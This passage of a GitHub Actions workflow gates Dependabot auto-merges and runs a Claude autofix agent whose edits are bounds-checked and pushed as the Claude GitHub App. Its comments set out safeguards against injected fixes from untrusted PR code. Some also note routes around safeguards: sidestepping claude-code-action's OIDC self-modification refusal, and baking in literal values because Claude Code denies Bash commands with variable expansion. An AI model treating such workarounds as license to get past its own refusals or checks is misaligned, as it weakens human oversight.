          echo "This is a prior, not a verdict — restrictions in classic branch protection and in App token scopes are invisible here, so the arm step tries the ranked list in order."

      - name: Deterministic auto-merge gate
        if: steps.pr.outputs.skip != 'true'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          PR_NUMBER: ${{ steps.pr.outputs.pr_number }}
          HEAD_BRANCH: ${{ steps.pr.outputs.head_branch }}
          CI_CONCLUSION: ${{ steps.ci.outputs.ci_conclusion }}
          ALLOWED_MERGE_METHODS: ${{ steps.methods.outputs.allowed_merge_methods }}
        run: |
          set -euo pipefail
          # `labels` rides along on the query we already make — it costs nothing
          # and is what keeps the escalation below idempotent.
          PR_JSON=$(gh pr view "$PR_NUMBER" --repo "$REPO" \
            --json state,author,comments,labels --jq '{state, author, comments, labels}')
          PR_STATE=$(echo "$PR_JSON" | jq -r '.state')
          PR_AUTHOR=$(echo "$PR_JSON" | jq -r '.author.login')
          PR_COMMENTS_JSON=$(echo "$PR_JSON" | jq -c '.comments')
          PR_LABELS=$(echo "$PR_JSON" | jq -r '.labels[].name')
          CHANGED_PATHS=$(gh pr diff "$PR_NUMBER" --repo "$REPO" --name-only)

          export HEAD_BRANCH CI_CONCLUSION PR_AUTHOR PR_STATE CHANGED_PATHS PR_COMMENTS_JSON
          export ALLOWED_MERGE_METHODS
          GATE_OUT=$(node .github/dependabot-automerge/gate.cjs)
          echo "$GATE_OUT"
          DECISION=$(echo "$GATE_OUT" | sed -n 's/^decision=//p')
          REASON=$(echo "$GATE_OUT" | sed -n 's/^reason=//p')
          # `reason` is prose for the log; `code` is the stable identifier this
          # step branches on. Re-parsing prose to decide whether to page someone
          # is how a notifier goes wrong.
          CODE=$(echo "$GATE_OUT" | sed -n 's/^code=//p')
          # The ranked merge methods are deterministic logic over the changed
          # paths and what this repo allows, so gate.cjs owns them. This step
          # never computes them — it only tries them in the order given.
          METHODS=$(echo "$GATE_OUT" | sed -n 's/^methods=//p')

          # Label + assign + comment. Both callers below share it; they differ in
          # whether the job then goes red, which is the real distinction between
          # "dep-steward broke" and "dep-steward is correctly stuck".
          notify_human() { # $1 = markdown body
            gh pr comment "$PR_NUMBER" --repo "$REPO" --body "$1" || true
            gh pr edit "$PR_NUMBER" --repo "$REPO" --add-label needs-human-review --add-assignee octocat || true
          }

          if [ "$DECISION" != "merge" ]; then
            echo "Not auto-merging PR #$PR_NUMBER — left for human review ($REASON)"
            # Arming is a latch, and the gate is re-derived on every wake, so a
            # later `skip` MUST revoke an earlier `merge`. Otherwise a singleton
            # whose LLM posts a superseding `escalate` verdict, or whose CI goes
            # red on a new push, stays armed to merge itself while gate.cjs is
            # saying no.
            #
            # Fails CLOSED. A failed or empty query yields "unknown", which
            # disarms rather than skipping: leaving a PR armed when we cannot
            # tell is the outcome that merges against the gate's wishes. The
            # `|| true` is on the query, so `set -e` cannot abort the step
            # before the disarm runs.
            ARMED_BY=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json autoMergeRequest \
              --jq '.autoMergeRequest.enabledBy.login // "none"' 2>/dev/null || echo "unknown")
            # An empty answer is "we could not tell", not "nobody armed it": the
            # jq default only covers a well-formed response, so a truncated or
            # empty one has to be normalised here or the case below reads it as
            # `none` and skips the disarm.
            [ -n "$ARMED_BY" ] || ARMED_BY="unknown"
            # `case` patterns are GLOBS, so an unquoted github-actions[bot] is a
            # character class matching `github-actionsb`/`github-actionso`/... and
            # NOT the literal login. Quoting makes it literal.
            case "$ARMED_BY" in
              none)
                ;;
              'app/github-actions'|'github-actions[bot]'|unknown)
                echo "Auto-merge was armed (by '$ARMED_BY') but the gate now says skip — disarming."
                gh pr merge "$PR_NUMBER" --repo "$REPO" --disable-auto || true
                ;;
              *)
                # A person armed this deliberately. Revoking a human's explicit
                # action silently is worse than leaving it: say so loudly and
                # let them decide.
                echo "::warning::PR #$PR_NUMBER is armed for auto-merge by '$ARMED_BY' (a human), but the gate says skip ($REASON). Leaving their auto-merge in place."
                ;;
            esac

            # Most refusals mean "not yet" — CI still running, review not posted —
            # and the gate will be woken again. Those must stay silent. A few mean
            # "never": nothing that can happen without a human will change the
            # answer, so the gate would refuse this PR forever and tell no one.
            # That is the defect this branch closes.
            #
            # An ALLOW-LIST, not a deny-list, so a code added later defaults to
            # SILENCE. Wrong-silent is recoverable; wrong-noisy trains you to
            # ignore the label, which costs you the next real one.
            #
            # Deliberately absent, each for a reason:
            #   verdict_missing    the review job's assertion already labels,
            #                      assigns and goes red — double-notifying is noise
            #   verdict_escalate / usage_affected
            #                      the reviewer labels the PR itself, by design
            #   ci_pending         transient by definition
            #   ci_indeterminate   cancelled / timed out / awaiting approval: a new
            #                      push re-runs CI and re-wakes the gate, so these
            #                      usually resolve themselves. Known gap, on
            #                      purpose; revisit if one is seen stranding a PR.
            #   author_not_dependabot / pr_not_open / no_changed_paths
            #                      anomalies, not stuck PRs — the gate is looking at
            #                      something it should not act on, and paging about
            #                      someone else's PR or an already-closed one is
            #                      exactly the noise that devalues the label
            #
            # ci_failed is absent: the autofix job owns it. It wakes on this same event and escalates itself when it cannot fix the build.
            case "$CODE" in
              paths_not_whitelisted|verdict_malformed)
                # Fires once per PR, not once per wake: this job runs on every CI
                # completion and every bot comment, so without the label check a
                # stuck PR would collect a comment each time.
                if grep -qxF 'needs-human-review' <<<"$PR_LABELS"; then
                  echo "PR #$PR_NUMBER is already labelled needs-human-review — not commenting again ($CODE)."
                else
                  echo "::warning::PR #$PR_NUMBER cannot merge without a human ($CODE): $REASON"
                  notify_human "$(printf '%s\n' \
                    '## dep-steward cannot merge this PR on its own' \
                    '' \
                    'The deterministic gate refused it, and this refusal will not resolve by itself:' \
                    '' \
                    '```' \
                    "$REASON" \
                    '```' \
                    '' \
                    "Reason code: \`$CODE\`" \
                    '' \
                    'Nothing further will happen to this PR until a person acts. The gate will keep refusing it on every wake-up, and this notice is posted once.')"
                fi
                ;;
            esac
            exit 0
          fi

          # Past this line the gate has AUTHORIZED the merge, so every remaining
          # failure is an execution failure, not a policy decision, and it gets
          # escalated to a human instead of dying as a red job on a workflow
          # nobody watches. A merge that fails silently is indistinguishable
          # from one that never ran — which is how a PR sits for days with green
          # CI and a correct `decision=merge` behind it.
          escalate() {
            echo "::error::dep-steward could not merge PR #$PR_NUMBER: $1"
            notify_human "$(printf '%s\n' \
              '## dep-steward could not complete the merge' \
              '' \
              'The deterministic gate **authorized** this merge:' \
              '' \
              '```' \
              "$REASON" \
              '```' \
              '' \
              'Execution then failed:' \
              '' \
              '```' \
              "$1" \
              '```' \
              '' \
              'This is an execution failure, not a policy decision. The gate said yes and GitHub refused.')"
            # Red, unlike the stuck-PR notice above: there the gate worked
            # correctly and the PR needs a person; here dep-steward itself failed
            # after authorizing, which is a malfunction and should look like one.
            exit 1
          }

          if [ "$METHODS" = "none" ] || [ -z "$METHODS" ]; then
            escalate "this repository permits no merge method (checked the repo settings and the default branch's rules), so there is nothing to arm. Enable at least one of merge/squash/rebase."
          fi

          # Arm GitHub's native auto-merge rather than merging imperatively.
          #
          # A synchronous merge is a time-of-check/time-of-use race: the gate
          # reads CI, then asks GitHub to merge, and anything that changes
          # mergeability in between turns into a refusal with no retry, because
          # this job only wakes on a head change or a comment. `gh`'s own error
          # text for the classic version of this ("the head branch is not up to
          # date with the base branch") says to add `--auto`.
          #
          # `--auto` is declarative WHERE IT MATTERS. gh downgrades it to an
          # immediate merge when the PR is already mergeable, which is the common
          # case, and merging now is the wanted outcome there anyway. Its value is
          # the other case: when something is still pending or blocked, GitHub
          # holds the request and merges the moment every requirement is
          # satisfied, instead of the step failing with no retry. Re-arming an
          # already-armed PR is a no-op, so repeated wakes are safe.
          #
          # TRY THE RANKED LIST IN ORDER. The probe above is a prior, not a
          # verdict — restrictions living in classic branch protection or in the
          # token's App scopes are invisible to it, so the first choice can be
          # refused by a repo that reported it as permitted. One refusal used to
          # end the run and page a human while a perfectly good second choice
          # went untried; that is the defect this loop closes.
          #
          # The refusal is NOT classified by matching GitHub's error prose. This
          # step already refuses to parse prose to decide whether to page
          # someone, and the same reasoning applies here: a failure that is not
          # about the method (unmergeable, 403, rate limit) fails identically on
          # every candidate, so it costs at most two extra calls and arrives at
          # the same escalation — carrying every error instead of only the first.
          MERGED_WITH=''
          TRAIL=''
          # Field-splitting on the comma happens once, when `for` expands the
          # list, so IFS is restored immediately and the body runs under the
          # normal one.
          OLD_IFS=$IFS
          IFS=','
          # shellcheck disable=SC2086
          set -- $METHODS
          IFS=$OLD_IFS
          for METHOD in "$@"; do
            echo "Arming auto-merge on PR #$PR_NUMBER, method $METHOD ($REASON)"
            # `set -e` is disarmed inside an `if` condition, so a refusal here
            # reaches the next line instead of killing the step mid-list.
            if ARM_OUT=$(gh pr merge "$PR_NUMBER" --repo "$REPO" --auto "--$METHOD" --delete-branch 2>&1); then
              MERGED_WITH="$METHOD"
              break
            fi
            TRAIL=$(printf '%s--%s: %s\n' "$TRAIL" "$METHOD" "$ARM_OUT")
            echo "::notice::PR #$PR_NUMBER: GitHub refused --$METHOD ($ARM_OUT). Trying the next ranked method."
          done

          if [ -z "$MERGED_WITH" ]; then
            escalate "$(printf 'every ranked merge method was refused (ranked: %s):\n\n%s' "$METHODS" "$TRAIL")"
          fi
          echo "Auto-merge armed on PR #$PR_NUMBER with --$MERGED_WITH."

  autofix:
    # Option B — when CI FAILS on a Dependabot PR, a Claude agent attempts a small
    # mechanical fix and PUSHES it to the PR branch for a human to review and
    # merge. It NEVER merges. Safety rests on three independent things:
    #   1. the agent's tools are allow-listed (Edit/Write/gh/grep/Read/WebFetch, no
    #      general Bash), and nothing it writes is run: the steps after it run
    #      only copies of this job's own files taken before it started. So
    #      neither the PR's untrusted code nor the agent's output is EXECUTED
    #      here, though this job holds a writable token;
    #   2. the pushed change is bounds-limited by autofix-bounds.cjs (small,
    #      source-only, not the bumped manifests, nothing under .github/);
    #   3. a human authorizes every merge, so an injected "fix" can at most land a
    #      tiny reviewed source edit on a PR branch — never on your default branch.
    # Runs on workflow_run (base context: secrets present, token writable), which
    # also sidesteps claude-code-action's OIDC self-modification refusal.
    #
    # WHO PUSHES decides whether CI runs on the fix. GitHub starts no workflow
    # for a push made with GITHUB_TOKEN, so a fix pushed that way sat with no CI
    # run and no merge-gate wake-up until a person pushed to the branch
    # (Runsense-ai/runsense#2693: nine days). A push made with a GitHub App's
    # installation token does start them, and one App is already on every repo
    # this pipeline runs in: the Claude Code GitHub App, which both agent jobs
    # need. So the fix is pushed as that App, with a token from the same OIDC
    # exchange claude-code-action performs (its src/github/token.ts; Anthropic's
    # own CI auto-fix example relies on it on workflow_run). Nothing to set up.
    #
    # That GitHub rule was also the only brake on fix, CI red, autofix, fix, and
    # so on. An App push releases it, so the brake is explicit: one autofix push
    # per PR (the `attempt` step).
    if: >
      github.event_name == 'workflow_run' &&
      github.event.workflow_run.event == 'pull_request' &&
      github.event.workflow_run.conclusion == 'failure' &&
      startsWith(github.event.workflow_run.head_branch, 'dependabot/')
    runs-on: ubuntu-latest
    timeout-minutes: 20
    permissions:
      contents: write
      pull-requests: write
      # The prompt's first step is reading the failing CI run (`gh pr checks`,
      # then `gh run view --log-failed`) — this job fires ONLY on a CI
      # failure, so that read is its whole reason to exist. These two grants
      # reach the agent ONLY because the fixer step passes
      # `github_token: secrets.GITHUB_TOKEN` below; without that input,
      # claude-code-action mints its own Claude-App token via OIDC, which
      # cannot read the Checks/Actions APIs, and the fixer diagnoses blind.
      # A job-level permissions block sets every unlisted scope to `none`,
      # so these must stay in step with what the agent's allow-list needs
      # (permissions.test.mjs enforces the mapping).
      checks: read
      actions: read
      # The push step exchanges this job's OIDC token for the Claude GitHub
      # App's installation token: the credential that makes CI run on the fix.
      # Without this grant there is no OIDC token and every fix falls back to a
      # push that starts no CI. (claude-code-action's own OIDC flow is unused
      # here, since the fixer passes github_token.)
      id-token: write
    env:
      # The fix commit's author. The push step writes it and the attempt step
      # looks for it: one definition, so the guard cannot drift from the commit
      # it guards against.
      AUTOFIX_AUTHOR_NAME: dep-steward[bot]
      AUTOFIX_AUTHOR_EMAIL: dep-steward@users.noreply.github.com
    concurrency:
      group: dependabot-autofix-${{ github.event.workflow_run.head_branch }}
      cancel-in-progress: true
    steps:
      - name: Resolve the PR (and confirm it is Dependabot's)
        id: pr
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
        run: |
          set -euo pipefail
          PR_NUMBER=$(gh pr list --repo "$REPO" --head "$HEAD_BRANCH" --state open --json number --jq '.[0].number // empty')
          if [ -z "$PR_NUMBER" ]; then
            echo "No open PR for $HEAD_BRANCH — nothing to do."; echo "skip=true" >> "$GITHUB_OUTPUT"; exit 0
          fi
          AUTHOR=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json author --jq '.author.login')
          # Two spellings, one App: gh returns `app/dependabot`, event payloads
          # return `dependabot[bot]` (gate.cjs documents the pair). And `case`
          # patterns are GLOBS, so an UNQUOTED dependabot[bot] is a character
          # class matching `dependabotb`/`dependaboto`/`dependabott` and NOT the
          # literal login — it would admit a near-miss human account and refuse
          # the App this step exists to recognise. Quoting makes both literal.
          case "$AUTHOR" in
            'app/dependabot'|'dependabot[bot]') : ;;
            *) echo "PR author is $AUTHOR, not Dependabot — nothing to do."; echo "skip=true" >> "$GITHUB_OUTPUT"; exit 0 ;;
          esac
          echo "pr_number=$PR_NUMBER" >> "$GITHUB_OUTPUT"
          echo "head_branch=$HEAD_BRANCH" >> "$GITHUB_OUTPUT"

      - name: One autofix push per PR (refuse when dep-steward already pushed a fix here)
        id: attempt
        if: steps.pr.outputs.skip != 'true'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          PR_NUMBER: ${{ steps.pr.outputs.pr_number }}
        run: |
          set -euo pipefail
          # Reads the PR's commits. Writes `proceed`, and one escalation when it
          # refuses. Touches no code and no token; every later step runs only on
          # proceed=true.
          #
          # ANY commit on the PR written by this job counts, not only the head:
          # a person's merge commit on top of the fix must not buy a second push.
          # A Dependabot recreate force-pushes the fix away, and then a fresh
          # attempt on the fresh bump is right.
          if ! PRIOR=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json commits \
            --jq '[.commits[] | select(any(.authors[]; .name == env.AUTOFIX_AUTHOR_NAME and .email == env.AUTOFIX_AUTHOR_EMAIL)) | .oid] | first // empty'); then
            # Fail CLOSED: without the commits there is no proving this is the
            # first attempt, so nothing is attempted. And fail LOUD: this job
            # owns a red build, so going quiet here would leave nobody told.
            echo "proceed=false" >> "$GITHUB_OUTPUT"
            echo "::error::Could not read PR #$PR_NUMBER's commits, so autofix cannot tell whether it already pushed a fix here; attempting nothing."
            gh pr comment "$PR_NUMBER" --repo "$REPO" --body "$(printf '%s\n' \
              "## CI is failing and dep-steward could not check it safely" \
              '' \
              "dep-steward could not read this PR's commits, so it cannot tell whether it already pushed a fix here, and it attempted nothing." \
              '' \
              'The deterministic gate will not merge a PR with a red build, so this one waits for a person.')" || true
            gh pr edit "$PR_NUMBER" --repo "$REPO" --add-label needs-human-review --add-assignee octocat || true
            exit 1
          fi
          if [ -z "$PRIOR" ]; then
            echo "proceed=true" >> "$GITHUB_OUTPUT"
            exit 0
          fi
          echo "proceed=false" >> "$GITHUB_OUTPUT"
          echo "dep-steward already pushed a fix to PR #$PR_NUMBER ($PRIOR). One push per PR, so escalating instead of fixing again."
          # Idempotent: this job wakes on every failing CI run.
          if gh pr view "$PR_NUMBER" --repo "$REPO" --json labels --jq '.labels[].name' 2>/dev/null | grep -qxF 'needs-human-review'; then
            echo "PR #$PR_NUMBER is already labelled needs-human-review, so not commenting again."
            exit 0
          fi
          gh pr comment "$PR_NUMBER" --repo "$REPO" --body "$(printf '%s\n' \
            "## CI is failing after dep-steward's fix" \
            '' \
            "dep-steward already pushed a fix to this PR (${PRIOR:0:7}), and CI is failing. Autofix makes one attempt per PR, so it will not push another." \
            '' \
            'The deterministic gate will not merge a PR with a red build, so this one waits for a person.')" || true
          gh pr edit "$PR_NUMBER" --repo "$REPO" --add-label needs-human-review --add-assignee octocat || true

      - name: Checkout the PR branch (the code the fixer edits)
        if: steps.attempt.outputs.proceed == 'true'
        uses: actions/checkout@v7
        with:
          ref: ${{ steps.pr.outputs.head_branch }}
          fetch-depth: 0

      - name: Snapshot the bump and this job's own files (before the fixer can touch anything)
        id: bump
        if: steps.attempt.outputs.proceed == 'true'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          PR_NUMBER: ${{ steps.pr.outputs.pr_number }}
        run: |
          set -euo pipefail
          # Reads the bump's paths, the pre-fix commit, and the prompt and
          # bounds script from the commit this workflow runs from. Writes
          # read-only copies outside the checkout, and base_sha. Touches
          # nothing else.
          #
          # The fixer can write anywhere in the checkout, pipeline files
          # included, and the bounds check runs after it. A bounds script it
          # rewrote would decide what is pushed, and would run with what that
          # step holds: GITHUB_TOKEN, and this job's OIDC token, which buys a
          # Claude App token. So the bounds step reads only these copies, kept
          # where Claude Code does not let the fixer write, and read-only
          # besides. They come from the workflow's own commit (the default
          # branch's, as the gate's do), not the PR head, which on a branch cut
          # before the install has neither file.
          #
          # A runner that keeps its temp directory between jobs (self-hosted)
          # can still hold the last job's read-only copies.
          chmod -R u+w "$RUNNER_TEMP/dep-steward" 2>/dev/null || true
          mkdir -p "$RUNNER_TEMP/dep-steward"
          gh pr diff "$PR_NUMBER" --repo "$REPO" --name-only > "$RUNNER_TEMP/dep-steward/bump-paths.txt"
          git show "$GITHUB_SHA:.github/dependabot-autofix-prompt.md" > "$RUNNER_TEMP/dep-steward/dependabot-autofix-prompt.md"
          git show "$GITHUB_SHA:.github/dependabot-automerge/autofix-bounds.cjs" > "$RUNNER_TEMP/dep-steward/autofix-bounds.cjs"
          chmod -R a-w "$RUNNER_TEMP/dep-steward"
          echo "base_sha=$(git rev-parse HEAD)" >> "$GITHUB_OUTPUT"

      - name: Load the autofix prompt
        id: load_prompt
        if: steps.attempt.outputs.proceed == 'true'
        env:
          # Bake the LITERAL PR number in — same reason as the review job: Claude Code
          # 2.1.207+ denies allowlisted Bash commands that contain a `$VAR` expansion,
          # so the agent must see `gh pr comment 123`, not `gh pr comment $PR_NUMBER`.
          PR_NUMBER: ${{ steps.pr.outputs.pr_number }}
          # The failing run's own clock, as FACT rather than inference. An agent
          # asked when "now" is answers from a date in its system prompt with no
          # time and no weekday, and three fixers in one batch produced three
          # different date rationales for the same failure — one of them simply
          # wrong ("2026-09-21, a Sunday"; it was a Monday). Every one of them
          # reached the right verdict, so the cost is not a wrong outcome: it is
          # an escalation comment that carries a false premise to the operator.
          # Time-dependent tests are exactly what a bump breaks, so the instant
          # the build ran is the anchor, not the instant anyone reasons about it.
          # Payload data travels by env, never interpolated into command text —
          # the same rule the auto-merge job's resolve step follows.
          CI_RUN_STARTED_AT: ${{ github.event.workflow_run.run_started_at }}
          CI_RUN_CREATED_AT: ${{ github.event.workflow_run.created_at }}
        run: |
          set -euo pipefail
          # %A is locale-dependent; hosted runners are C.UTF-8 but self-hosted
          # ones need not be, and a localized weekday would be worse than none.
          export LC_ALL=C
          # NOW first, and it cannot fail: it is the fallback for everything
          # below. This step runs under `bash -e`, so an unguarded `date -d`
          # on a malformed payload value would kill it — and the bounds step
          # runs on `!cancelled()`, so the job would then page a human with
          # "CI is failing and dep-steward could not fix it" for a build the
          # fixer was never given the chance to read.
          NOW_UTC=$(date -u +%Y-%m-%dT%H:%M:%SZ)
          NOW_WEEKDAY=$(date -u +%A)
          CI_RUN_STARTED="$NOW_UTC"
          for candidate in "${CI_RUN_STARTED_AT:-}" "${CI_RUN_CREATED_AT:-}"; do
            case "$candidate" in
              [0-9][0-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9]T[0-9][0-9]:[0-9][0-9]:[0-9][0-9]Z)
                CI_RUN_STARTED="$candidate"; break ;;
            esac
          done
          CI_RUN_WEEKDAY=$(date -u -d "$CI_RUN_STARTED" +%A 2>/dev/null || echo "$NOW_WEEKDAY")
          {
            echo 'prompt<<PROMPT_EOF_9Z3Q'
            # `|` delimiters on the four facts: the values are ISO-8601 UTC
            # stamps and English weekday names, so none of `|`, `&`, `\` can
            # occur in them and the replacement text is inert. No placeholder is
            # a prefix of another, so the order of the expressions is free.
            sed -e "s/\$PR_NUMBER/$PR_NUMBER/g" \
                -e "s|\$CI_RUN_STARTED|$CI_RUN_STARTED|g" \
                -e "s|\$CI_RUN_WEEKDAY|$CI_RUN_WEEKDAY|g" \
                -e "s|\$NOW_UTC|$NOW_UTC|g" \
                -e "s|\$NOW_WEEKDAY|$NOW_WEEKDAY|g" \
                "$RUNNER_TEMP/dep-steward/dependabot-autofix-prompt.md"
            echo 'PROMPT_EOF_9Z3Q'
          } >> "$GITHUB_OUTPUT"

      - name: Run the Claude fixer (edits source in place; never pushes/merges)
        id: fixer
        if: steps.attempt.outputs.proceed == 'true'
        # SHA-pinned, same as the review job — bump deliberately, not implicitly.
        uses: anthropics/claude-code-action@1623c36729ac1cd5895198cded705a287de7db79 # v1.0.187
        env:
          PR_NUMBER: ${{ steps.pr.outputs.pr_number }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          allowed_bots: "dependabot[bot]"
          # The fixer's `gh` runs on THIS token, so the job's checks:/actions:
          # read grants reach it and `gh run view --log-failed` works. Its
          # comments post as github-actions[bot], which is safe HERE: autofix
          # comments carry no AUTOMERGE-DECISION-V1 block and nothing needs to
          # wake on them. Do NOT copy this input to the review step — the
          # review comment must come from the App identity or the gate's
          # issue_comment wake-up never fires (see the workflow header).
          github_token: ${{ secrets.GITHUB_TOKEN }}
          prompt: ${{ steps.load_prompt.outputs.prompt }}
          # Edit/Write make the fix; gh/grep/Read/Glob/WebFetch investigate. NO
          # general Bash, so the PR's untrusted code is never executed in this
          # contents:write context — only the agent's own edits and gh metadata.
          claude_args: >-
            --max-turns 40 --model claude-opus-4-8
            --allowedTools "Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr checks:*),Bash(gh pr edit:*),Bash(gh pr view:*),Bash(gh release view:*),Bash(gh run view:*),Bash(gh run list:*),Bash(grep:*),Read,Grep,Glob,Edit,Write,WebFetch"

      - name: Bounds-check the fix (decide it is pushed, or discard and escalate)
        id: bounds
        if: ${{ !cancelled() && steps.attempt.outputs.proceed == 'true' }}
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          PR_NUMBER: ${{ steps.pr.outputs.pr_number }}
          HEAD_BRANCH: ${{ steps.pr.outputs.head_branch }}
          BASE_SHA: ${{ steps.bump.outputs.base_sha }}
          # The real error on a failed fixer run lives here, not in the run log.
          EXEC_FILE: ${{ steps.fixer.outputs.execution_file }}
          # `skipped` when a step before it failed: nothing was diagnosed.
          FIXER_OUTCOME: ${{ steps.fixer.outcome }}
        run: |
          set -euo pipefail
          # The agent's comment draft is not part of the fix. It writes one to
          # the prescribed path (its prompt names it, the way the reviewer's
          # names `.dep-steward-review.md`) and posts it with --body-file; left
          # in the tree it stages as an ADDED file, and the bounds check below
          # refuses any status but M — so the real fix is discarded along with
          # it and the PR is told the fix "exceeded the safe bounds". That
          # happened on three PRs in one weekly batch.
          #
          # Removed here, not exempted in autofix-bounds.cjs: an added file the
          # pipeline did not ask for must still escalate. (A repo that tracks a
          # file at this exact path would see it staged as D and escalate,
          # which is the safe direction.)
          rm -f .dep-steward-autofix-comment.md
          FIX_NAME_STATUS=''
          FIX_NUMSTAT=''
          # A fixer that never ran edited nothing, and the step that failed
          # before it may not have recorded the pre-fix commit, so there is
          # nothing to diff.
          if [ "${FIXER_OUTCOME:-}" != skipped ]; then
            git add -A
            FIX_NAME_STATUS=$(git diff --cached --name-status "$BASE_SHA")
            FIX_NUMSTAT=$(git diff --cached --numstat "$BASE_SHA")
          fi
          if [ -z "$FIX_NAME_STATUS" ]; then
            echo "The fixer made no edits."
            # Distinguish "agent genuinely found nothing" from "agent never ran" (e.g.
            # an invalid token). Without this, a 401 looks identical to a clean no-op.
            DETAIL='It found nothing it could safely fix.'
            if [ "${FIXER_OUTCOME:-}" = skipped ]; then
              echo "The fixer never ran: a step before it failed."
              DETAIL='The fixer never ran, because a step before it failed, so the build was never diagnosed. The autofix run log says which step.'
            fi
            if [ -n "${EXEC_FILE:-}" ] && [ -f "$EXEC_FILE" ]; then
              AGENT_ERR=$(jq -rs '[.. | objects | select(.is_error == true) | (.result // .error)] | map(select(. != null)) | .[0] // empty' "$EXEC_FILE" 2>/dev/null || true)
              if [ -n "$AGENT_ERR" ]; then
                echo "The fixer agent errored (so it could not attempt a fix): $AGENT_ERR"
                DETAIL="The fixer could not run, so the build was never diagnosed: $AGENT_ERR"
                case "$AGENT_ERR" in
                  *'Invalid bearer token'*|*authentication*|*401*)
                    echo "  -> CLAUDE_CODE_OAUTH_TOKEN is invalid or expired. Re-mint it with 'claude setup-token'."
                    DETAIL="$DETAIL (CLAUDE_CODE_OAUTH_TOKEN looks invalid or expired — re-mint it with \`claude setup-token\` and re-run the installer.)" ;;
                esac
              fi
            fi
            # This job is the ONLY thing watching a red Dependabot build — the
            # auto-merge gate deliberately stays quiet on ci_failed when autofix
            # is on, precisely so you are not paged about a build being fixed.
            # So when the fixer declines, the notification has to happen HERE and
            # DETERMINISTICALLY. It used to depend on the agent choosing to label
            # the PR itself, which its prompt asks for but nothing enforces: an
            # agent that errored, or simply did not, left a red PR with nobody
            # told. That is "covered sometimes", which is worse than not covered.
            #
            # Idempotent: this job wakes on every failing CI run, so re-label
            # without re-commenting once the PR is already flagged.
            if gh pr view "$PR_NUMBER" --repo "$REPO" --json labels --jq '.labels[].name' 2>/dev/null | grep -qxF 'needs-human-review'; then
              echo "PR #$PR_NUMBER is already labelled needs-human-review — not commenting again."
            else
              echo "::warning::CI is failing on PR #$PR_NUMBER and autofix could not fix it — escalating."
              gh pr comment "$PR_NUMBER" --repo "$REPO" --body "$(printf '%s\n' \
                '## CI is failing and dep-steward could not fix it' \
                '' \
                "$DETAIL" \
                '' \
                'The deterministic gate will not merge a PR with a red build, so this one waits for a person.')" || true
              gh pr edit "$PR_NUMBER" --repo "$REPO" --add-label needs-human-review --add-assignee octocat || true
            fi
            exit 0
          fi
          BUMP_PATHS=$(cat "$RUNNER_TEMP/dep-steward/bump-paths.txt")
          export FIX_NAME_STATUS FIX_NUMSTAT BUMP_PATHS
          # The copy taken before the fixer started, never the checkout's.
          OUT=$(node "$RUNNER_TEMP/dep-steward/autofix-bounds.cjs")
          echo "$OUT"
          DECISION=$(echo "$OUT" | sed -n 's/^decision=//p')
          REASON=$(echo "$OUT" | sed -n 's/^reason=//p')
          if [ "$DECISION" != "push" ]; then
            echo "Fix is out of bounds ($REASON) — discarding and escalating (the ephemeral runner is thrown away, so nothing is pushed)."
            gh pr edit "$PR_NUMBER" --repo "$REPO" --add-label needs-human-review --add-assignee octocat
            gh pr comment "$PR_NUMBER" --repo "$REPO" --body "dep-steward autofix drafted a change but it exceeded the safe bounds ($REASON), so it was discarded and left for a human."
            exit 0
          fi
          # In bounds. Pushing is the next steps' job, after the mint: this step
          # never holds a credential that starts workflows, and a push token
          # exists only for a fix that will be pushed.
          echo "Fix is within bounds ($REASON); the next steps push it."
          {
            echo "decision=push"
            echo "reason=$REASON"
          } >> "$GITHUB_OUTPUT"

      - name: Push the fix (as the Claude GitHub App, so CI runs on it)
        id: push
        if: ${{ !cancelled() && steps.bounds.outputs.decision == 'push' }}
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          PR_NUMBER: ${{ steps.pr.outputs.pr_number }}
          HEAD_BRANCH: ${{ steps.pr.outputs.head_branch }}
          REASON: ${{ steps.bounds.outputs.reason }}
          WORKFLOW_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          set -euo pipefail
          # Reads the staged fix, this job's OIDC token and GITHUB_TOKEN. Writes
          # one commit to the PR branch and one comment. Decides nothing about
          # the fix itself. The Claude App token it pushes with is asked for,
          # used and revoked inside this step: no other step ever holds it.
          git config user.name "$AUTOFIX_AUTHOR_NAME"
          git config user.email "$AUTOFIX_AUTHOR_EMAIL"
          git commit -m "fix(deps): mechanical fix for the ${HEAD_BRANCH} bump [dep-steward autofix]"

          # The push must use exactly the token chosen below. The working tree
          # holds GITHUB_TOKEN twice by now: actions/checkout's header (in a file
          # its config includes) and claude-code-action's `origin`, rewritten to
          # https://x-access-token:<github_token>@... Either one would quietly
          # make this a GITHUB_TOKEN push, which starts no CI. So the push names
          # its URL itself, with no credential in it, resets every inherited
          # header for this server under the same key checkout uses (an unscoped
          # `http.extraheader=` does not reach a server-scoped one), and sends
          # its own. An explicit Authorization header also outranks anything a
          # credential helper supplies, so a rejected token fails as itself.
          basic_for() { printf 'x-access-token:%s' "$1" | base64 | tr -d '\n'; }
          push_with() { # $1 = the basic credential; prints what git said
            GIT_TERMINAL_PROMPT=0 git \
              -c "http.$GITHUB_SERVER_URL/.extraheader=" \
              -c "http.$GITHUB_SERVER_URL/.extraheader=AUTHORIZATION: basic $1" \
              push "$GITHUB_SERVER_URL/$REPO.git" "HEAD:$HEAD_BRANCH" 2>&1
          }

          # The Claude GitHub App's installation token, asked for exactly as
          # claude-code-action asks for it: this job's OIDC token (audience
          # claude-code-github-action) exchanged at Anthropic's endpoint, which
          # answers for any repo the Claude App is installed on.
          PUSHED_WITH=''
          TRAIL=''
          APP_TOKEN=''
